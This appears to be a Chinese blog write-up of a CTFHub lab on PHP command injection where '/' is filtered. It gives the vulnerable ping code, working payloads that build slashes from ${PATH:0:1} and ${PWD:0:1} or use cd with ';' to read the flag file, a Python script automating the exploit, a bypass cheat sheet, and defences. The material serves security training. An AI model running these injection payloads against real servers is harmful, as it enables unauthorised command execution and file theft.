---
layout: post
title: CTFHub - 命令注入 过滤目录分隔符 Writeup
platform: ctfhub
date: 2026-10-23 20:02:00 +0800
categories: CTF
---

CTFHub - 命令注入 过滤目录分隔符 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **命令注入** → 过滤目录分隔符）
- 题型：Web
- 考点：**`/` 过滤绕过**、变量子串展开、`cd` 与 `|` 的子 shell 陷阱


```text
★ 页面源码：

    <?php
    if (isset($_GET['ip']) && $_GET['ip']) {
        $ip = $_GET['ip'];
        $m = [];
        if (!preg_match_all("/\//", $ip, $m)) {      // ★ 过滤 "/"
            $cmd = "ping -c 4 {$ip}";
            exec($cmd, $res);
        } else {
            $res = $m;
        }
    }
    ?>

★ 验证过滤：

    ?ip=127.0.0.1|ls /
    → Array( [0] => Array( [0] => / ) )       ❌ 被拦

★ 关键发现 1：当前目录就是网站根目录，不用 / 也能操作

    ?ip=127.0.0.1|ls -la
    → drwxr-xr-x 2 root root 4096 flag_is_here      ← ★ 有个目录！
      -rw-r--r-- 1 root root  676 index.php

    ?ip=127.0.0.1|ls flag_is_here
    → flag_2655573777111.php                        ← ★ flag 在里面

★ 关键发现 2：`${PATH:0:1}` 能取出 "/"

    ?ip=127.0.0.1|ls -la ${PATH:0:1}var${PATH:0:1}www${PATH:0:1}html
    → 正常列出 /var/www/html
    
    ★ ${PATH:0:1} = PATH 变量的第 0 个字符 = "/"
    ★ ${PWD:0:1} 同样可以（PWD 是当前目录，也以 / 开头）

★ 三种读 flag 的方式（全部实测成功）：

    ① 相对路径 + 变量拼斜杠
       ?ip=127.0.0.1|cat flag_is_here${PATH:0:1}flag_2655573777111.php

    ② cd 进去（用 ; 不是 |）
       ?ip=127.0.0.1;cd flag_is_here;cat flag_2655573777111.php

    ③ 完全用 ${PWD:0:1} 拼绝对路径
       ?ip=127.0.0.1|cat ${PWD:0:1}var${PWD:0:1}www${PWD:0:1}html${PWD:0:1}flag_is_here${PWD:0:1}flag_2655573777111.php

    → 全部返回：<?php // ctfhub{eac0e2c9902ae36fc35c153f}

flag         : ctfhub{eac0e2c9902ae36fc35c153f}
```

二、题目分析

**① 过滤 `/` 意味着什么**

```
/ 是 Linux 的路径分隔符
    /var/www/html/flag.php
    └─┬┘ └─┬┘ └─┬┘
    目录分隔全靠 /

过滤 / 之后：
    ❌ 不能用绝对路径（/flag、/etc/passwd）
    ❌ 不能用多级相对路径（../..）
    ✅ 但还能用【当前目录的文件名】（如 ls、index.php）
```

**★ 所以这题的突破口是**：

```
① 当前目录（/var/www/html）里就有东西可以看
② 想办法"造出"一个 / 
```

**② 关键认知：`cd` 和 `ls` 都不需要 `/`**

```bash
ls                      # 列当前目录
ls -la                  # 详细列表
ls flag_is_here         # 列子目录（子目录名后面不加 /）
cat index.php           # 读当前目录的文件
```

**★ 本题实测**：

```
?ip=127.0.0.1|ls -la
→ 发现 flag_is_here 目录

?ip=127.0.0.1|ls flag_is_here
→ flag_2655573777111.php
```

**★ 只靠"相对路径"就能找到 flag 的位置，根本不需要 `/`。**

**③ `/` 的绕过方法（核心技巧）**

**方法 A：`${PATH:0:1}`（最常用）**

```bash
echo ${PATH:0:1}
/
```

**原理**：

```bash
$PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
        ↑
      第一个字符就是 "/"

${PATH:0:1}
      │ │ └─ 取 1 个字符
      │ └─── 从位置 0 开始
      └───── 变量名
```

**★ 这是 bash 的"子串展开"语法 `${VAR:offset:length}`。**

**用法**：

```bash
cat ${PATH:0:1}flag                        # → cat /flag
ls ${PATH:0:1}var${PATH:0:1}www            # → ls /var/www
cat flag_is_here${PATH:0:1}flag.php        # → cat flag_is_here/flag.php
```

**方法 B：`${PWD:0:1}`**

```bash
$PWD = /var/www/html
       ↑
     第一个字符也是 "/"
```

**用法相同**：

```bash
cat ${PWD:0:1}flag
```

**方法 C：命令替换生成 `/`**

```bash
$(pwd | cut -c1)              # 取 pwd 输出的第一个字符
$(printf '\57')               # 八进制 57 = "/"
$(printf '\x2f')              # 十六进制 2f = "/"
$(echo Lw== | base64 -d)      # base64 "Lw==" = "/"
```

**★ 但 `printf` 需要参数，如果空格也被过滤就麻烦。**

**方法 D：不用 `/`，用 `cd`**

```bash
cd flag_is_here; cat flag.php
```

**★ `cd` 不需要 `/`（目录名是当前目录的子目录）。**

**④ ⚠️ 重要陷阱：`|` 后面的 `cd` 不生效**

**错误写法**：

```
?ip=127.0.0.1|cd flag_is_here;ls -la
→ 列出的还是 /var/www/html 的内容！
```

**为什么**：

```bash
ping -c 4 127.0.0.1 | cd flag_is_here ; ls -la
                     └──────┬──────┘
                    管道右边在【子 shell】里执行
                    
    ① 管道 | 会为左右两边各开一个子 shell
    ② cd 在子 shell 里执行 → 改了子 shell 的当前目录
    ③ 子 shell 结束 → 目录改动丢失
    ④ 后面的 ls -la 在【父 shell】里执行 → 还是原目录
```

**正确写法**：

```
?ip=127.0.0.1;cd flag_is_here;cat flag_2655573777111.php
             └┬┘
        用分号：同一个 shell 里顺序执行 → cd 生效
```

**★ 这是 shell 的经典坑**：

```
;  → 同一 shell 顺序执行（cd 生效）
|  → 左右各开子 shell（cd 不生效）
&& → 同一 shell 条件执行（cd 生效）
```

**⑤ `exec()` 输出的是"整个管道"的结果**

```php
exec("ping -c 4 127.0.0.1;cd flag_is_here;cat flag.php", $res);
```

**输出数组包含**：

```
$res[0] = "PING 127.0.0.1 ..."        ← ping 的输出
$res[1] = "64 bytes from ..."
...
$res[n] = "<?php // ctfhub{...}"      ← cat 的输出
```

**★ 所以用 `;` 时会有 ping 的噪音，flag 在数组最后几行。**

**用 `|` 就没噪音**（ping 的输出被丢给下一个命令的 stdin）：

```
?ip=127.0.0.1|cat flag_is_here${PATH:0:1}flag.php
→ 只有 flag，干净
```

三、解题步骤

**第 1 步：看源码，确认过滤规则**

```
show_source 显示：

    if (!preg_match_all("/\//", $ip, $m)) {   // 过滤 / 
        exec("ping -c 4 {$ip}", $res);
    }

★ 只过滤 /，其他都放过（空格、|、; 都能用）
```

**第 2 步：验证过滤**

```
?ip=127.0.0.1|ls /
→ 被拦
```

**第 3 步：用相对路径探索**

```
?ip=127.0.0.1|ls -la
→ total 20
  drwxr-xr-x 2 root root 4096 flag_is_here      ← ★ 目标目录
  -rw-r--r-- 1 root root  676 index.php

?ip=127.0.0.1|ls flag_is_here
→ flag_2655573777111.php                        ← ★ flag 文件
```

**★ 这一步完全没用 `/`，纯相对路径。**

**第 4 步：读 flag（三种方式任选）**

**方式 ①：`${PATH:0:1}` 拼斜杠（推荐）**

```
?ip=127.0.0.1|cat flag_is_here${PATH:0:1}flag_2655573777111.php
→ <?php // ctfhub{eac0e2c9902ae36fc35c153f}
```

**方式 ②：`cd` + `;`**

```
?ip=127.0.0.1;cd flag_is_here;cat flag_2655573777111.php
→ （前面有 ping 噪音）<?php // ctfhub{eac0e2c9902ae36fc35c153f}
```

**方式 ③：`${PWD:0:1}` 拼完整绝对路径**

```
?ip=127.0.0.1|cat ${PWD:0:1}var${PWD:0:1}www${PWD:0:1}html${PWD:0:1}flag_is_here${PWD:0:1}flag_2655573777111.php
→ <?php // ctfhub{eac0e2c9902ae36fc35c153f}
```

**第 5 步：提交 → 通关**

---

**手工操作（浏览器）**

```
① IP 框填：127.0.0.1|ls -la
② Ping → 看到 flag_is_here 目录

③ IP 框填：127.0.0.1|ls flag_is_here
④ Ping → 看到 flag_2655573777111.php

⑤ IP 框填：
   127.0.0.1|cat flag_is_here${PATH:0:1}flag_2655573777111.php
⑥ Ping → 看到 flag

★ 如果 ${...} 不好输，用方式 ②：
   127.0.0.1;cd flag_is_here;cat flag_2655573777111.php
```

---

**自动化脚本**

```python
import ssl, urllib.parse, urllib.request, re

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

BASE = "http://challenge-xxx:10800"
F = "flag_2655573777111.php"


def run(payload):
    u = BASE + "/?ip=" + urllib.parse.quote(payload, safe="")
    with urllib.request.urlopen(u, context=CTX, timeout=30) as r:
        body = r.read().decode('utf-8', 'replace')
    m = re.search(r'<pre>\s*(.*?)\s*</pre>', body, re.S)
    return (m.group(1).strip() if m else "").replace("\n", " ")


print(run("127.0.0.1|ls -la"))                                   # 找目录
print(run("127.0.0.1|ls flag_is_here"))                          # 找文件
print(run("127.0.0.1|cat flag_is_here${PATH:0:1}" + F))          # 读 flag
```

**★ 用 `/` 的替代写法时，注意 Python 字符串里的 `${PATH:0:1}` 不做插值
  （因为不是 f-string），会原样传给 URL。**

四、延伸知识

**① `/` 的各种绕过方式**

| 方式 | 写法 | 前提 |
|---|---|---|
| **`${PATH:0:1}`** | `cat ${PATH:0:1}flag` | bash/sh（多数支持）|
| **`${PWD:0:1}`** | `cat ${PWD:0:1}flag` | 同上 |
| **`cd`** | `cd flag_is_here;cat x` | 目录在当前目录下 |
| `$(printf '\x2f')` | `cat $(printf '\x2f')flag` | 需要空格 |
| `$(pwd\|cut -c1)` | 取 pwd 首字符 | 需要空格 |
| `$(echo Lw==\|base64 -d)` | Base64 解码 | 需要空格 |
| `$HOME` 里的 `/` | `${HOME:0:1}` | 同 PATH |
| `tr` 命令 | `echo var\|tr ...` | 复杂 |

**★ 最常用的是 `${PATH:0:1}`**，因为它**不需要空格**（如果空格也被过滤也能用）。

**② `${VAR:offset:length}` 语法详解**

```bash
VAR="abcdef"

${VAR:0:1}    → "a"        （从 0 开始取 1 个）
${VAR:1:1}    → "b"
${VAR:0:3}    → "abc"
${VAR:2}      → "cdef"     （省略长度 = 取到结尾）
${VAR: -2}    → "ef"       （负数 = 从末尾数，注意空格）
```

**用在 PATH 上**：

```bash
$PATH = /usr/local/sbin:/usr/local/bin:...
${PATH:0:1}  = "/"        ← 首字符
${PATH:1:3}  = "usr"      ← 可以拼单词！
```

**★ 进阶玩法**：环境变量里有很多字符可以用子串取出来：

```bash
${PATH:1:3}     → usr
${PATH:4:1}     → /     （/usr 后面的 /）
${HOME:0:1}     → /
${SHELL:0:1}    → /
${PWD:0:1}      → /
```

**③ 全过滤场景的组合技（预告）**

**如果同时过滤了空格、`/`、`cat`、`flag`**：

```bash
# 目标：cat /flag
# 可用：${IFS}（空格）、${PATH:0:1}（斜杠）、通配符（cat/flag 名）

/bin/ca?${IFS}${PATH:0:1}f*
```

**拆解**：

```
/bin/ca?         → /bin/cat      （通配符绕过 cat 过滤）
${IFS}           → 空格           （绕过空格过滤）
${PATH:0:1}      → /              （绕过斜杠过滤）
f*               → flag           （绕过 flag 过滤）
```

**★ 这就是"全过滤题"的终极组合。**

**④ Bypass 时要注意的 shell 差异**

| 特性 | bash | dash/sh | 本题 |
|---|---|---|---|
| `${VAR:0:1}` | ✅ | ✅ | ✅ |
| `{a,b}` 花括号展开 | ✅ | ❌ | ❌ |
| `$'\x20'` | ✅ | ❌ | |
| `<<<` here-string | ✅ | ❌ | |
| `echo -e` | ✅ | ❌（dash 的 echo 不解析 -e）| |

**★ 所以写 payload 时，优先用 POSIX 通用的（`${VAR:0:1}`、`${IFS}`、
  `$()`、反引号），少用 bash 专有的。**

**⑤ 防护**

```text
① ★ escapeshellarg()（一劳永逸）
    exec("ping -c 4 " . escapeshellarg($ip));
    → 输入被单引号包住，`/`、空格、`;` 全失效

② ★ 白名单校验
    filter_var($ip, FILTER_VALIDATE_IP)

③ ★ 不用 shell（fsockopen 等）

④ 黑名单（本题）→ 永远能被绕过（过滤 / 还有 10 种方法造出 /）
```

**⑥ 本题 vs 前面的对比**

| 题目 | 过滤 | 绕过核心 |
|---|---|---|
| 无过滤 | 无 | `;` / `\|` |
| 过滤 cat | `cat` | `tac` / `ca\t` / `/bin/ca?` |
| 过滤空格 | `' '` | `${IFS}` / Tab / `<` |
| **过滤 /** | **`/`** | **`${PATH:0:1}` / `cd`** |

**★ 每加一个过滤，就多一层"变体思维"。**

五、总结

- **本题核心：`/` 被过滤 → 用 `cd` 走相对路径，或用 `${PATH:0:1}` 造出 `/`。**
- 三种 payload（都实测成功）：

```
① |cat flag_is_here${PATH:0:1}flag_2655573777111.php
② ;cd flag_is_here;cat flag_2655573777111.php
③ |cat ${PWD:0:1}var${PWD:0:1}www${PWD:0:1}html${PWD:0:1}flag_is_here${PWD:0:1}flag_2655573777111.php
```

- **三个必记要点**：

```text
① 当前目录就能 ls/cat —— 相对路径完全不需要 /
② ${PATH:0:1} / ${PWD:0:1} 取出首字符 "/"（bash 子串展开语法）
③ | 后面的 cd 不生效（子 shell）—— 要用 ; 或 &&
```

- **实测 flag**：

```text
ctfhub{eac0e2c9902ae36fc35c153f}
（在 /var/www/html/flag_is_here/flag_2655573777111.php）
```

- CTFHub 命令注入系列进度：

```text
✅ 无过滤          —— ; 和 |
✅ 过滤 cat        —— tac/more/ca\t/通配符
✅ 过滤空格        —— ${IFS}/Tab/<
✅ 过滤 /          —— 本题：${PATH:0:1} / cd
⬜ 过滤关键字      —— 通配符 / 拼接 / Base64
```

**手工复现要点**：

```text
· ls -la → 发现 flag_is_here 目录（不用 /）
· ls flag_is_here → 找到 flag 文件名（不用 /）
· cat flag_is_here${PATH:0:1}flag_xxx.php → 读出来
· 备选：;cd flag_is_here;cat flag_xxx.php（注意用 ; 不是 |）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  过滤 / 的两种思路：                                     │
│                                                        │
│  ① 躲开：用相对路径（ls / cd / cat 文件名）              │
│  ② 造出来：${PATH:0:1}、${PWD:0:1}、${HOME:0:1}         │
│           —— 环境变量首字符几乎都是 /                    │
│                                                        │
│  ★ 陷阱：| 右边是子 shell，cd 白做 → 用 ; 或 &&          │
└────────────────────────────────────────────────────────┘
```
